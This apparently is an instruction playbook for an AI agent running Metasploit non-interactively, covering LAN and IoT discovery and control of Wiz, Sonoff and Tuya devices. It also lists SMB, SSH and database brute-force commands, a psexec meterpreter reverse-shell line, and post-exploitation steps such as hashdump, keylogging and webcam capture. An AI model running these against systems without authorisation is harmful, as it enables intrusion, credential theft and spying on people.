# Metasploit Framework — Expert Playbook

You are a Metasploit expert. You know every module, every technique, every trick. msfconsole takes 10-15 seconds to load — that's NORMAL, don't cancel it.

## Rule #0: Non-Interactive Only — ALWAYS EXIT

msfconsole has NO TTY in this environment. You MUST use:
- `-x "commands; exit"` — inline commands, **MUST end with exit**
- `-r script.rc` — resource script file, **ALWAYS combine with `-x "exit"`**
- `-q` — quiet mode (skip banner, faster startup)

**CRITICAL**: msfconsole HANGS after running a resource script unless you tell it to exit.
- With `-x`: `msfconsole -q -x "commands; exit"`
- With `-r`: `msfconsole -q -r script.rc -x "exit"`
- In `.rc` files: add `exit` as the LAST line (after `</ruby>` if using Ruby)

NEVER run bare `msfconsole` — it will be BLOCKED.
If msfconsole times out, you probably forgot `exit`.

## Rule #1: Command Chaining with -x

**CRITICAL**: `-x` commands MUST be semicolon-separated on ONE LINE. Newlines inside `-x` will break parsing.
Multiple commands go in ONE -x string, separated by semicolons:
```bash
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 22,80,443,445,3389,8080,38899; set THREADS 10; run; exit"
```

For complex workflows, use resource scripts:
```bash
cat > /tmp/scan.rc << 'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,135,139,443,445,3389,5985,8080,8081,38899
set THREADS 20
run
exit
EOF
msfconsole -q -r /tmp/scan.rc
```

## Rule #2: Useful Modules by Category

### Network Discovery
```bash
# TCP port scan (most reliable without root)
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 1-1024,3389,5985,8080,8081,38899; set THREADS 20; run; exit"

# UDP sweep (finds IoT devices — SNMP on 161, mDNS on 5353, NetBIOS on 137)
# NOTE: udp_sweep does NOT support PORTS option — it probes a fixed set of UDP services
msfconsole -q -x "use auxiliary/scanner/discovery/udp_sweep; set RHOSTS 192.168.1.0/24; set THREADS 20; run; exit"

# UDP probe (targeted — sends protocol-specific probes)
msfconsole -q -x "use auxiliary/scanner/discovery/udp_probe; set RHOSTS 192.168.1.0/24; set THREADS 20; run; exit"

# ARP sweep (fast, finds everything on LAN — requires root)
msfconsole -q -x "use auxiliary/scanner/discovery/arp_sweep; set RHOSTS 192.168.1.0/24; set THREADS 20; run; exit"

# IPv6 neighbor discovery
msfconsole -q -x "use auxiliary/scanner/discovery/ipv6_neighbor; set RHOSTS 192.168.1.0/24; run; exit"
```

### SMB / Windows
```bash
# SMB version detection (identifies Windows version)
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; set THREADS 10; run; exit"

# SMB share enumeration
msfconsole -q -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS TARGET; run; exit"

# SMB user enumeration
msfconsole -q -x "use auxiliary/scanner/smb/smb_enumusers; set RHOSTS TARGET; run; exit"

# SMB login brute force
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS TARGET; set SMBUser administrator; set PASS_FILE /usr/share/wordlists/rockyou.txt; set THREADS 4; run; exit"

# MS17-010 EternalBlue check
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; run; exit"

# PsExec (get shell with valid creds)
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS TARGET; set SMBUser administrator; set SMBPass password; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP; exploit; exit"
```

### SSH
```bash
# SSH version detection
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS 192.168.1.0/24; set THREADS 10; run; exit"

# SSH brute force
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /tmp/passwords.txt; set THREADS 4; run; exit"

# SSH key login
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login_pubkey; set RHOSTS TARGET; set USERNAME root; set KEY_PATH /home/user/.ssh/id_rsa; run; exit"
```

### HTTP / Web
```bash
# HTTP version/header detection
msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS 192.168.1.0/24; set THREADS 10; run; exit"

# Directory scanner
msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS TARGET; set THREADS 10; run; exit"

# Web application fingerprint
msfconsole -q -x "use auxiliary/scanner/http/http_header; set RHOSTS TARGET; run; exit"

# WordPress scanner
msfconsole -q -x "use auxiliary/scanner/http/wordpress_scanner; set RHOSTS TARGET; run; exit"
```

### Database
```bash
# MySQL login
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /tmp/passwords.txt; run; exit"

# PostgreSQL login
msfconsole -q -x "use auxiliary/scanner/postgres/postgres_login; set RHOSTS TARGET; set USERNAME postgres; run; exit"

# MSSQL enumeration
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS 192.168.1.0/24; run; exit"
```

### IoT / Smart Home
```bash
# SNMP enumeration (many IoT devices respond)
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.1.0/24; set THREADS 10; run; exit"

# UPnP discovery (routers, smart TVs, IoT)
msfconsole -q -x "use auxiliary/scanner/upnp/ssdp_msearch; set RHOSTS 192.168.1.0/24; run; exit"

# mDNS discovery (Sonoff, Shelly, printers — finds _ewelink._tcp services)
msfconsole -q -x "use auxiliary/scanner/mdns/query; set RHOSTS 192.168.1.0/24; run; exit"

# Telnet banner grab (cheap IoT often has telnet)
msfconsole -q -x "use auxiliary/scanner/telnet/telnet_version; set RHOSTS 192.168.1.0/24; set THREADS 10; run; exit"

# Sonoff switch discovery (HTTP port 8081)
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 8081; set THREADS 20; run; exit"

# Tuya device discovery (TCP port 6667,6668)
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 6667,6668; set THREADS 20; run; exit"

# Full IoT sweep (all smart home ports at once)
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set PORTS 80,1883,6667,6668,8081,8883,9999,38899; set THREADS 20; run; exit"
```

### Sonoff Control via Metasploit Ruby
Sonoff = HTTP REST on port 8081. MSF Ruby has `Net::HTTP` built-in, so control works natively.
**NOTE**: If device has `encrypt=true`, commands return error 401 — you need the API key.
```bash
cat > /tmp/sonoff_control.rc << 'RCEOF'
<ruby>
require 'net/http'
require 'json'

# Replace with actual Sonoff IPs from scan results
targets = %w[192.168.1.18 192.168.1.30 192.168.1.46]

targets.each do |ip|
  begin
    # Get device info first
    uri = URI("http://#{ip}:8081/zeroconf/info")
    req = Net::HTTP::Post.new(uri, 'Content-Type' => 'application/json')
    req.body = '{"deviceid":"","data":{}}'
    http = Net::HTTP.new(uri.host, uri.port)
    http.open_timeout = 3
    http.read_timeout = 3
    res = http.request(req)
    info = JSON.parse(res.body) rescue {}

    if info["error"] == 0
      print_good("#{ip} — Sonoff online (encrypt=false): #{info['data']}")
      # Turn ON
      uri2 = URI("http://#{ip}:8081/zeroconf/switch")
      req2 = Net::HTTP::Post.new(uri2, 'Content-Type' => 'application/json')
      req2.body = '{"deviceid":"","data":{"switch":"on"}}'
      res2 = http.request(req2)
      print_good("#{ip} — Switch ON: #{res2.body}")
    elsif info["error"] == 401
      print_warning("#{ip} — encrypt=true (needs API key, use Python)")
    else
      print_warning("#{ip} — unexpected response: #{info}")
    end
  rescue => e
    print_error("#{ip} — offline/error: #{e.message}")
  end
end
</ruby>
exit
RCEOF
msfconsole -q -r /tmp/sonoff_control.rc
```

### Tuya Probe via Metasploit Ruby
Tuya = encrypted TCP on port 6668. MSF Ruby can DISCOVER but NOT control (needs local key + crypto).
**For control, use Python `tinytuya` library instead.**
```bash
cat > /tmp/tuya_discover.rc << 'RCEOF'
<ruby>
print_status("Probing for Tuya devices on TCP 6667/6668...")
# Replace with IPs found by port scan
targets = %w[192.168.1.50 192.168.1.51 192.168.1.52]
ports = [6668, 6667]

targets.each do |ip|
  ports.each do |port|
    begin
      sock = TCPSocket.new(ip, port)
      sock.setsockopt(1, 20, [3, 0].pack("l_2"))  # SO_RCVTIMEO
      print_good("#{ip}:#{port} — Tuya device ONLINE")
      sock.close
      break  # found on this port, skip other
    rescue Errno::ECONNREFUSED
      next
    rescue => e
      print_error("#{ip}:#{port} — #{e.message}")
    end
  end
end

print_status("Tuya control requires local_key. Get keys with: python3 -m tinytuya wizard")
print_status("Then control with: python3 -c \"import tinytuya; d=tinytuya.OutletDevice('ID','IP','KEY',version=3.3); d.turn_on()\"")
</ruby>
exit
RCEOF
msfconsole -q -r /tmp/tuya_discover.rc
```

### Custom UDP Probe (for Wiz lights on port 38899)
Metasploit has NO native Wiz module. **Best approach**: use Python for UDP discovery/control,
then feed results into Metasploit's database via `db_import` if needed.

**WARNING**: MSF's embedded Ruby does NOT have standard Socket constants (Socket::SOL_SOCKET etc.).
Use raw integer values (SOL_SOCKET=1, SO_BROADCAST=6, SO_RCVTIMEO=20 on Linux) or better: use Python.

**Recommended approach — Python discovery + MSF integration**:
```bash
# Step 1: Find Wiz lights with Python (reliable, fast, 2 seconds)
python3 -c "
import socket, json
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
sock.settimeout(3)
sock.bind(('', 38899))
msg = json.dumps({'method':'registration','params':{'phoneMac':'AAAAAAAAAAAA','register':False,'phoneIp':'0.0.0.0','id':'1'}})
sock.sendto(msg.encode(), ('192.168.1.255', 38899))
lights = []
while True:
    try:
        data, addr = sock.recvfrom(1024)
        lights.append(addr[0])
        info = json.loads(data)
        mac = info.get('result',{}).get('mac','?')
        print(f'{addr[0]} MAC={mac}')
    except socket.timeout:
        break
sock.close()
print(f'Found {len(lights)} Wiz lights')
"

# Step 2: Import into MSF database (optional)
msfconsole -q -x "workspace -a wiz; db_nmap -sU -p 38899 192.168.1.29,192.168.1.122,192.168.1.146 --open; hosts; exit"
```

**Alternative — Pure MSF Ruby (with raw constants)**:
```bash
cat > /tmp/wiz_discover.rc << 'RCEOF'
<ruby>
require 'json'

print_status("Scanning for Wiz lights on UDP 38899...")
msg = '{"method":"registration","params":{"phoneMac":"AAAAAAAAAAAA","register":false,"phoneIp":"0.0.0.0","id":"1"}}'

sock = UDPSocket.new
sock.setsockopt(1, 6, true)          # SOL_SOCKET=1, SO_BROADCAST=6
sock.setsockopt(1, 20, [3, 0].pack("l_2"))  # SO_RCVTIMEO=20
sock.bind("0.0.0.0", 0)
sock.send(msg, 0, "192.168.1.255", 38899)

lights = []
begin
  loop do
    data, addr = sock.recvfrom(1024)
    ip = addr[3]
    info = JSON.parse(data) rescue {}
    mac = info.dig("result", "mac") || "unknown"
    print_good("Wiz light found: #{ip} (MAC: #{mac})")
    lights << { ip: ip, mac: mac }
  end
rescue Errno::EAGAIN, Errno::EWOULDBLOCK
end
sock.close

if lights.empty?
  print_error("No Wiz lights found")
else
  print_good("Found #{lights.length} Wiz light(s)")
  lights.each { |l| print_line("  #{l[:ip]} — MAC: #{l[:mac]}") }
end
</ruby>
exit
RCEOF
msfconsole -q -r /tmp/wiz_discover.rc
```

### Custom UDP Control (Wiz lights via Metasploit)

**WARNING**: MSF Ruby lacks `Socket::SOL_SOCKET` etc. Use raw integers (same as discovery script).

```bash
cat > /tmp/wiz_control.rc << 'RCEOF'
<ruby>
require 'json'

target = "WIZ_IP_HERE"
port = 38899

def wiz_send(ip, port, method, params={})
  sock = UDPSocket.new
  sock.setsockopt(1, 20, [2, 0].pack("l_2"))  # SOL_SOCKET=1, SO_RCVTIMEO=20
  msg = JSON.generate({ id: 1, method: method, params: params })
  sock.send(msg, 0, ip, port)
  begin
    data, _ = sock.recvfrom(1024)
    return JSON.parse(data)
  rescue Errno::EAGAIN, Errno::EWOULDBLOCK
    return nil
  ensure
    sock.close
  end
end

# Get current state
state = wiz_send(target, port, "getPilot")
if state
  print_good("Light #{target} state: #{state}")
else
  print_error("No response from #{target}")
end

# Turn ON
result = wiz_send(target, port, "setState", { state: true })
print_good("Turn ON: #{result}")

# Set color (red)
# result = wiz_send(target, port, "setPilot", { r: 255, g: 0, b: 0, dimming: 100 })

# Set scene (Party = 4)
# result = wiz_send(target, port, "setPilot", { sceneId: 4 })
</ruby>
exit
RCEOF
msfconsole -q -r /tmp/wiz_control.rc
```

## Rule #3: Meterpreter Sessions

When you get a meterpreter shell, use these commands (via -x):
```bash
# Post-exploitation enumeration
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS TARGET; set SMBUser admin; set SMBPass pass; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP; exploit -z; sessions -i 1 -c 'sysinfo; getuid; hashdump; exit'; exit"

# Common meterpreter commands (for resource scripts):
# sysinfo, getuid, hashdump, getsystem, shell, upload, download
# screenshot, keyscan_start, keyscan_dump, webcam_snap
# route, portfwd, arp, netstat, ps, migrate
```

## Rule #4: Database & Workspace

```bash
# Initialize database (first time only)
sudo msfdb init

# Use workspaces to organize scans
msfconsole -q -x "workspace -a home_network; db_nmap -sT -sV -T4 --top-ports 1000 192.168.1.0/24; hosts; services; exit"

# Query results later
msfconsole -q -x "workspace home_network; hosts; services -p 445; vulns; exit"
```

## Rule #5: Timeouts & Performance

- msfconsole takes **10-15 seconds** to load — this is NORMAL, do NOT cancel
- Set `THREADS 10-20` for network scans
- Use `set ConnectTimeout 5` for faster scanning
- Large scans (full /24 with all ports) take 2-5 minutes
- Use `db_nmap` instead of `nmap` to store results in Metasploit's database
- After a scan, use `hosts` and `services` to query results

## Key Reminders
- ALWAYS use `-q -x "...;exit"` or `-q -r script.rc` (with `exit` as last line in .rc)
- `-x` commands: semicolons on ONE LINE — NO newlines inside the quoted string
- NEVER run bare `msfconsole` — it will be BLOCKED
- MSF Ruby: NO `Socket::SOL_SOCKET` — use raw integers (1, 6, 20) or use Python instead
- `udp_sweep` has NO PORTS option — it probes a fixed set of UDP services
- For Wiz lights: **prefer Python/socat** (port 38899). Only use MSF Ruby if user asks
- For Sonoff switches: HTTP on port 8081 — MSF Ruby can control via `Net::HTTP` (encrypt=false) or discover (encrypt=true needs Python)
- For Tuya devices: TCP 6668 — try default key FIRST, or flash Tasmota for HTTP control (see 35-iot-liberation.md)
- For Tasmota/OpenBeken devices (post-flash): HTTP port 80 — `curl http://IP/cm?cmnd=Power%20On`
- msfconsole output includes stty noise — this is filtered automatically
- The database (`msfdb`) stores all scan results persistently
